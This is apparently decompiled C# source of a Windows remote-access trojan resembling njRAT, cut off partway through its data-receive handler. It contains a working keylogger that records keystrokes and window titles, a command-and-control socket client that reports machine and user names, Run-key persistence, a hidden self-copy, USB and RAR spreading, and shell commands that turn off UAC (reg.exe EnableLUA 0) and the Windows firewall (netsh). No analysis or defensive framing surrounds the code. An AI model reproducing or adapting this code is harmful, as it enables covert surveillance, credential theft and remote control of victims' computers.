using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using n.My;
using n.My.Resources;

namespace n;

[DesignerGenerated]
public class B : Form
{
	public class Key
	{
		private static Clock Clock = new Clock();

		private static Keyboard K = new Keyboard();

		public static void Start()
		{
			try
			{
				string text = default(string);
				while (true)
				{
					Thread.Sleep(10);
					int i = 8;
					do
					{
						if (GetAsyncKeyState(i) == -32767)
						{
							if (Operators.CompareString(text, w(), false) == 0)
							{
								string N = KK(ref i);
								Wrt(ref N);
							}
							else
							{
								string N;
								if (((object)w() != "") & ((object)w() != " "))
								{
									text = w();
									N = HM() + text + "\r\n\r\n";
									Wrt(ref N);
								}
								N = KK(ref i);
								Wrt(ref N);
							}
						}
						i = checked(i + 1);
					}
					while (i <= 255);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static string HM()
		{
			return "\r\n\r\n[" + Conversions.ToString(Clock.get_LocalTime().Month) + "\\" + Conversions.ToString(Clock.get_LocalTime().Day) + "][" + Conversions.ToString(Clock.get_LocalTime().Hour) + ":" + Conversions.ToString(Clock.get_LocalTime().Minute) + "] ";
		}

		public static void Wrt(ref string N)
		{
			string N2 = "lg";
			string DF = "";
			string text = NK.GetValue(ref N2, ref DF);
			if (text.Length > 51200)
			{
				text = "";
			}
			DF = "lg";
			N2 = text + N;
			NK.SetValue(ref DF, ref N2);
		}

		public static void Write(ref string S)
		{
			if (KON)
			{
				try
				{
					B b = MyProject.Forms.B;
					string T = "X" + IND.Y + S;
					b.SEND(ref T);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					KON = false;
					ProjectData.ClearProjectError();
				}
			}
			byte[] bytes = Encoding.Default.GetBytes(S);
			FileStream fileStream = new FileStream(Application.get_StartupPath() + "\\" + exename, FileMode.Append);
			fileStream.Write(bytes, 0, bytes.Length);
			int num = checked((int)fileStream.Length);
			fileStream.Close();
			if (num > 51200)
			{
				try
				{
					File.Delete(Application.get_StartupPath() + "\\" + exename);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}

		public static string KK(ref int i)
		{
			string text = "0123456789qwertyuiop[]{}asdfghjkl:;'\\|zxcvbnm,.<>/?~!@#$%^&*()_-+=\\|\"";
			string text2 = ")!@#$%^&*(";
			switch (i)
			{
			case 8:
				return "{BACKSPACE}";
			case 9:
				return "{TAP}";
			case 12:
				return "\r\n";
			case 13:
				return "\r\n";
			case 27:
				return "{ESC}";
			case 32:
				return " ";
			case 46:
				return "{DEL}";
			case 186:
				if (u())
				{
					return ":";
				}
				return ";";
			case 187:
				if (u())
				{
					return "+";
				}
				return "=";
			case 188:
				if (u())
				{
					return "<";
				}
				return ",";
			case 189:
				if (u())
				{
					return "_";
				}
				return "-";
			case 190:
				if (u())
				{
					return ">";
				}
				return ".";
			case 191:
				if (u())
				{
					return "?";
				}
				return "/";
			case 192:
				if (u())
				{
					return "~";
				}
				return "`";
			case 219:
				if (u())
				{
					return "{";
				}
				return "[";
			case 221:
				if (u())
				{
					return "}";
				}
				return "]";
			case 222:
				if (u())
				{
					return "\"";
				}
				return "'";
			case 220:
				if (u())
				{
					return "|";
				}
				return "\\";
			default:
				if (Strings.InStr(text, Strings.ChrW(i).ToString().ToLower(), (CompareMethod)0) > 0)
				{
					if (u())
					{
						try
						{
							int num = 0;
							do
							{
								if (Conversions.ToDouble(Strings.ChrW(i).ToString()) != (double)num)
								{
									num = checked(num + 1);
									continue;
								}
								return Conversions.ToString(text2[num]);
							}
							while (num <= 9);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						return Strings.ChrW(i).ToString().ToUpper();
					}
					return Strings.ChrW(i).ToString().ToLower();
				}
				return "";
			}
		}

		public static bool u()
		{
			if (K.get_CapsLock() & !K.get_ShiftKeyDown())
			{
				return true;
			}
			if (!K.get_CapsLock() & K.get_ShiftKeyDown())
			{
				return true;
			}
			return false;
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern short GetAsyncKeyState(int vKey);

		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetWindowTextLengthA(long hwnd);

		public static string w()
		{
			checked
			{
				try
				{
					IntPtr foregroundWindow = GetForegroundWindow();
					if (foregroundWindow == IntPtr.Zero)
					{
						return " ";
					}
					int windowTextLengthA = GetWindowTextLengthA((long)foregroundWindow);
					string WinTitle = Strings.StrDup(windowTextLengthA + 1, "*");
					GetWindowTextA(foregroundWindow, ref WinTitle, windowTextLengthA + 1);
					int lpdwProcessID = default(int);
					GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
					if (lpdwProcessID != 0)
					{
						try
						{
							return Process.GetProcessById(lpdwProcessID).MainWindowTitle;
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							string result = WinTitle;
							ProjectData.ClearProjectError();
							return result;
						}
					}
					return WinTitle;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					string result = " ";
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}
	}

	private IContainer components;

	[AccessedThroughProperty("fs")]
	private FileSystemWatcher _fs;

	public static bool Fw = false;

	public static bool FT = false;

	public static bool netsh;

	public static bool isFT;

	public static bool KON;

	public static string Vname = "VmljdGlt";

	public static bool DS;

	public static string PC = "X";

	public static string ver = "1.5.2";

	public static string exename;

	private string LA;

	public static bool ISEND;

	public A BW;

	public static bool Busy;

	public static int ms;

	[AccessedThroughProperty("WC")]
	private SocketsClient _WC;

	[AccessedThroughProperty("wL")]
	private Timer _wL;

	[AccessedThroughProperty("k")]
	private Timer _k;

	public static string no = "127.0.0.1:7";

	public static string Ai;

	public static string SU = "*";

	public static bool UU;

	public static string Uo = "*";

	public static string Ui = "*";

	public static string spread = "*";

	public static string mU = "*";

	public static string FR;

	public static string Cht;

	private int c2;

	private int cc;

	private int c0;

	public static Mutex jMutex;

	public static chat Chat;

	private string IP;

	private static string[] Block = new string[100000];

	private static int inx;

	private static int err;

	internal virtual FileSystemWatcher fs
	{
		get
		{
			return _fs;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			FileSystemEventHandler value2 = fs_Created;
			if (_fs != null)
			{
				_fs.Created -= value2;
			}
			_fs = value;
			if (_fs != null)
			{
				_fs.Created += value2;
			}
		}
	}

	public virtual SocketsClient WC
	{
		get
		{
			return _WC;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			SocketsClient.onDataArrivalEventHandler value2 = W3;
			SocketsClient.onDisconnectEventHandler value3 = W2;
			SocketsClient.onErrorEventHandler value4 = W1;
			SocketsClient.onConnectEventHandler value5 = W0;
			if (_WC != null)
			{
				_WC.onDataArrival -= value2;
				_WC.onDisconnect -= value3;
				_WC.onError -= value4;
				_WC.onConnect -= value5;
			}
			_WC = value;
			if (_WC != null)
			{
				_WC.onDataArrival += value2;
				_WC.onDisconnect += value3;
				_WC.onError += value4;
				_WC.onConnect += value5;
			}
		}
	}

	public virtual Timer wL
	{
		get
		{
			return _wL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = delegate
			{
				wL_();
			};
			if (_wL != null)
			{
				_wL.remove_Tick(eventHandler);
			}
			_wL = value;
			if (_wL != null)
			{
				_wL.add_Tick(eventHandler);
			}
		}
	}

	public virtual Timer k
	{
		get
		{
			return _k;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_k = value;
		}
	}

	public B()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(B_FormClosing));
		((Form)this).add_Load((EventHandler)B_Load);
		BW = new A();
		WC = new SocketsClient();
		wL = new Timer();
		k = new Timer();
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)MyProject.Forms.B);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		fs = new FileSystemWatcher();
		((ISupportInitialize)fs).BeginInit();
		((Control)this).SuspendLayout();
		fs.IncludeSubdirectories = true;
		fs.SynchronizingObject = (ISynchronizeInvoke?)this;
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("B");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((ISupportInitialize)fs).EndInit();
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(long vKey);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetProcessWorkingSetSize(IntPtr process, int minimumWorkingSetSize, int maximumWorkingSetSize);

	public static void E()
	{
		try
		{
			while (true)
			{
				Thread.Sleep(10000);
				GC.Collect();
				GC.WaitForPendingFinalizers();
				if (Environment.OSVersion.Platform == PlatformID.Win32NT)
				{
					SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void CL()
	{
		KON = false;
		Busy = false;
		try
		{
			chat.clos = true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void B_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() == 1)
		{
			ProjectData.EndApp();
		}
		else
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	public void R()
	{
		MemoryStream memoryStream = new MemoryStream();
		Array array = File.ReadAllBytes(Application.get_ExecutablePath());
		checked
		{
			int num = array.Length - 400;
			int num2 = array.Length - 1;
			int num3 = default(int);
			int num4 = default(int);
			for (int i = num; i <= num2; i++)
			{
				if (Operators.CompareString(Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { i }, (string[])null)))) + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { i - 1 }, (string[])null)))) + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { i - 2 }, (string[])null)))), "***", false) == 0)
				{
					num3 = i + 1;
				}
				if (Operators.CompareString(Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { i }, (string[])null)))) + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { i - 1 }, (string[])null)))) + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { i - 2 }, (string[])null)))), "^^^", false) == 0)
				{
					num4 = i - 3;
				}
				if (unchecked(num3 > 0 && num4 == 0))
				{
					memoryStream.WriteByte(Conversions.ToByte(NewLateBinding.LateIndexGet((object)array, new object[1] { i }, (string[])null)));
				}
			}
			byte[] array2 = memoryStream.ToArray();
			memoryStream = new MemoryStream();
			memoryStream.Write(array2, 1, array2.Length - 3);
			Encoding @default = Encoding.Default;
			byte[] b = memoryStream.ToArray();
			bool CM = false;
			Array array3 = Strings.Split(@default.GetString(API.ZIP(b, ref CM)), IND.Y, -1, (CompareMethod)0);
			no = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 0 }, (string[])null));
			SU = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null));
			string s;
			if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array3, new object[1] { 2 }, (string[])null), (object)"*", false))
			{
				Ai = "*";
			}
			else
			{
				Ai = Interaction.Environ(Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 2 }, (string[])null)), ":", -1, (CompareMethod)0)[1]) + "\\" + Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 2 }, (string[])null)), ":", -1, (CompareMethod)0)[0];
				if (Operators.CompareString(Ai, Application.get_ExecutablePath(), false) != 0)
				{
					try
					{
						if (File.Exists(Ai))
						{
							File.Delete(Ai);
						}
						File.Copy(Application.get_ExecutablePath(), Ai, overwrite: true);
						try
						{
							File.SetAttributes(Ai, FileAttributes.Hidden);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						if (Operators.CompareString(Conversions.ToString(Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 2 }, (string[])null)), ":", -1, (CompareMethod)0)[2][0]), "T", false) == 0)
						{
							string ai = Ai;
							s = Application.get_ExecutablePath();
							Process.Start(ai, "Kill@" + API.ENB(ref s));
						}
						else
						{
							Process.Start(Ai);
						}
						ProjectData.EndApp();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.EndApp();
						ProjectData.ClearProjectError();
					}
				}
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array3, new object[1] { 3 }, (string[])null), (object)"^", false))
				{
					UU = true;
				}
				if (Strings.InStr(Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 4 }, (string[])null)), "*", (CompareMethod)0) == 0)
				{
					Uo = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 4 }, (string[])null));
					Thread thread = new Thread(delegate(object a0)
					{
						USB.USb(Conversions.ToString(a0));
					});
					thread.Start(Uo);
					spread = "(" + Uo + ")USB,";
				}
				mU = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 5 }, (string[])null));
				try
				{
					Mutex.OpenExisting(mU);
					ProjectData.EndApp();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				jMutex = new Mutex(initiallyOwned: true, mU);
				if (!Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array3, new object[1] { 6 }, (string[])null), (object)"*", false))
				{
					spread += "Rar,";
					Ui = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 6 }, (string[])null));
					fs.Path = Interaction.Environ("homedrive") + "\\";
					fs.EnableRaisingEvents = true;
				}
			}
			if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array3, new object[1] { 9 }, (string[])null), (object)"^", false))
			{
				Fw = true;
			}
			else
			{
				Fw = false;
			}
			Registry.CurrentUser.CreateSubKey(Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 8 }, (string[])null)));
			NK.Key = Conversions.ToString(Operators.ConcatenateObject((object)"HKEY_CURRENT_USER\\Software\\", NewLateBinding.LateIndexGet((object)array3, new object[1] { 8 }, (string[])null)));
			s = "vname";
			string DF = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 7 }, (string[])null));
			string value = NK.GetValue(ref s, ref DF);
			NewLateBinding.LateIndexSetComplex((object)array3, new object[2] { 7, DF }, (string[])null, true, false);
			Vname = value;
		}
	}

	private void B_Load(object sender, EventArgs e)
	{
		try
		{
			exename = Process.GetCurrentProcess().ProcessName;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			exename = "!";
			ProjectData.ClearProjectError();
		}
		try
		{
			Control.set_CheckForIllegalCrossThreadCalls(false);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			byte[] plugin = Resources.plugin;
			bool CM = false;
			C.Plug = API.ZIP(plugin, ref CM);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			PC = Environment.MachineName + "\\" + Environment.UserName;
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		((Control)this).Hide();
		((Control)this).set_Visible(false);
		try
		{
			string text = Interaction.Command();
			if (text.Length > 0)
			{
				Array array = Strings.Split(text, "@", -1, (CompareMethod)0);
				object obj = NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null);
				if (Operators.ConditionalCompareObjectEqual(obj, (object)"!0", false))
				{
					Thread.Sleep(100);
					try
					{
						Process.GetProcessById(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null))).Kill();
						Process[] processesByName = Process.GetProcessesByName("wscript");
						foreach (Process process in processesByName)
						{
							try
							{
								process.Kill();
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
						}
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					try
					{
						File.Delete(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)));
						((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)));
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(obj, (object)"..", false))
				{
					Thread.Sleep(2000);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj, (object)"Kill", false))
				{
					try
					{
						string s = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
						string path = API.DEB(ref s);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, s }, (string[])null, true, false);
						File.Delete(path);
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.ConditionalCompareObjectEqual(((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().GetValue("!", null), (object)null, false))
			{
				FR = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Clock().get_LocalTime()) + " >> " + Application.get_ExecutablePath();
				((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().SetValue("!", API.ENB(ref FR));
			}
			else
			{
				string s = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().GetValue("!", "*"));
				FR = API.DEB(ref s);
			}
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			FR = "*";
			ProjectData.ClearProjectError();
		}
		try
		{
			R();
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			SU = "*";
			mU = "*";
			try
			{
				NK.Key = "HKEY_CURRENT_USER\\Software\\nKey";
				string s = "vname";
				Vname = NK.GetValue(ref s, ref Vname);
			}
			catch (Exception projectError13)
			{
				ProjectData.SetProjectError(projectError13);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
		try
		{
			string s = "FT";
			string DF = "";
			if (Operators.CompareString(NK.GetValue(ref s, ref DF), "", false) == 0)
			{
				FT = true;
				DF = "FT";
				s = "&";
				NK.SetValue(ref DF, ref s);
			}
		}
		catch (Exception projectError14)
		{
			ProjectData.SetProjectError(projectError14);
			ProjectData.ClearProjectError();
		}
		cc = 4;
		wL.set_Interval(1000);
		wL.set_Enabled(true);
		if (UU)
		{
			BW.B.RunWorkerAsync();
		}
		Thread thread = new Thread(E);
		thread.Start();
		try
		{
			Interaction.Shell("reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError15)
		{
			ProjectData.SetProjectError(projectError15);
			ProjectData.ClearProjectError();
		}
		Thread thread2 = new Thread(Key.Start);
		thread2.Start();
		con();
	}

	public void wL_()
	{
		wL.set_Enabled(false);
		checked
		{
			try
			{
				cc++;
				c0++;
				if (c2 < 5)
				{
					c2++;
				}
				if (c2 == 5)
				{
					try
					{
						Process[] processesByName = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
						foreach (Process process in processesByName)
						{
							try
							{
								if (FileSystem.FileLen(process.MainModule!.FileName) != FileSystem.FileLen(Process.GetCurrentProcess().MainModule!.FileName) || process.Id == Process.GetCurrentProcess().Id)
								{
									continue;
								}
								try
								{
									process.Kill();
									Process[] processesByName2 = Process.GetProcessesByName("wscript");
									foreach (Process process2 in processesByName2)
									{
										try
										{
											process2.Kill();
										}
										catch (Exception projectError)
										{
											ProjectData.SetProjectError(projectError);
											ProjectData.ClearProjectError();
										}
									}
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					if (Cht.Length > 0)
					{
						Chat = new chat();
						chat.clos = false;
						Chat.nick = Cht;
						((Control)Chat).Show();
						Cht = "";
					}
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					Cht = "";
					ProjectData.ClearProjectError();
				}
				if (Operators.CompareString(SU, "*", false) != 0 && cc > 4)
				{
					try
					{
						RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
						if (Operators.ConditionalCompareObjectEqual(registryKey.GetValue(SU), (object)null, false))
						{
							registryKey.SetValue(SU, Application.get_ExecutablePath() + " @..");
						}
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					try
					{
						RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
						if (Operators.ConditionalCompareObjectEqual(registryKey2.GetValue(SU), (object)null, false))
						{
							registryKey2.SetValue(SU, Application.get_ExecutablePath());
						}
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					cc = 0;
				}
				try
				{
					if (WC.Connected())
					{
						if (ISEND)
						{
							if (FT & !isFT)
							{
								isFT = true;
								string T = "#blue";
								SEND(ref T);
								Thread.Sleep(100);
							}
							bool p = false;
							string text = API.A1(ref p);
							if (Operators.CompareString(LA, text, false) != 0 && Operators.CompareString(text, "", false) != 0)
							{
								LA = text;
								string T = "#3" + IND.Y + LA;
								SEND(ref T);
							}
						}
					}
					else
					{
						Dis();
						con();
					}
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					Dis();
					con();
					ProjectData.ClearProjectError();
				}
				if (c0 > 3)
				{
					c0 = 1;
					try
					{
						if (Operators.CompareString(Dns.GetHostByName(Strings.Split(no, ":", -1, (CompareMethod)0)[0]).AddressList[0].ToString(), IP, false) != 0)
						{
							IP = Dns.GetHostByName(Strings.Split(no, ":", -1, (CompareMethod)0)[0]).AddressList[0].ToString();
							try
							{
								Dis();
							}
							catch (Exception projectError9)
							{
								ProjectData.SetProjectError(projectError9);
								ProjectData.ClearProjectError();
							}
						}
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError11)
			{
				ProjectData.SetProjectError(projectError11);
				ProjectData.ClearProjectError();
			}
			wL.set_Enabled(true);
		}
	}

	public void con()
	{
		try
		{
			try
			{
				IP = Dns.GetHostByName(Strings.Split(no, ":", -1, (CompareMethod)0)[0]).AddressList[0].ToString();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			CL();
			DS = false;
			if (Fw)
			{
				try
				{
					string path = IND.TM + Conversions.ToString(Process.GetCurrentProcess().Id);
					byte[] p = Resources.P;
					bool CM = false;
					File.WriteAllBytes(path, API.ZIP(p, ref CM));
					Interaction.Shell(IND.TM + Conversions.ToString(Process.GetCurrentProcess().Id) + " " + Conversions.ToString(Process.GetCurrentProcess().Id), (AppWinStyle)2, false, -1);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			if (!netsh)
			{
				netsh = true;
				try
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = "netsh";
					processStartInfo.Arguments = "firewall set opmode disable";
					processStartInfo.CreateNoWindow = true;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					Process.Start(processStartInfo);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			WC = new SocketsClient();
			WC.Connect(Strings.Split(no, ":", -1, (CompareMethod)0)[0], Conversions.ToInteger(Strings.Split(no, ":", -1, (CompareMethod)0)[1]));
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		Thread.Sleep(1500);
	}

	public void Dis()
	{
		try
		{
			CL();
			DS = true;
			ISEND = false;
			WC.Disconnect();
			WC = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void SEND(ref string T)
	{
		try
		{
			WC.SendData(WC.STB(T));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void W0()
	{
		try
		{
			string T = "#2" + IND.Y + API.A0() + IND.Y + Vname;
			SEND(ref T);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			try
			{
				string text = "X";
				int num = 0;
				do
				{
					text += "\r\nX";
					num = checked(num + 1);
				}
				while (num <= 5);
				string T = "#2" + IND.Y + text + IND.Y + Vname;
				SEND(ref T);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
		ISEND = true;
		Thread.Sleep(100);
		if (Fw)
		{
			try
			{
				Process.GetProcessesByName(Conversions.ToString(Process.GetCurrentProcess().Id))[0].Kill();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				Thread.Sleep(10);
				File.Delete(IND.TM + Process.GetCurrentProcess().Id);
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
		CL();
		DS = false;
	}

	public void W1(string T)
	{
		CL();
	}

	public void W2()
	{
		CL();
		DS = true;
		ISEND = false;
	}

	public void W3(byte[] Data, int totBytes)
	{
		checked
		{
			try
			{
				MemoryStream memoryStream = new MemoryStream();
				string text = "nj-q8";
				byte[] array = new byte[5];
				int num = Data.Length - text.Length;
				int num2 = 0;
				while (true)
				{
					if (num2 <= num)
					{
						array[0] = Data[num2];
						array[1] = Data[num2 + 1];
						array[2] = Data[num2 + 2];
						array[3] = Data[num2 + 3];
						array[4] = Data[num2 + 4];
						if (Operators.CompareString(Encoding.Default.GetString(array), text, false) == 0)
						{
							break;
						}
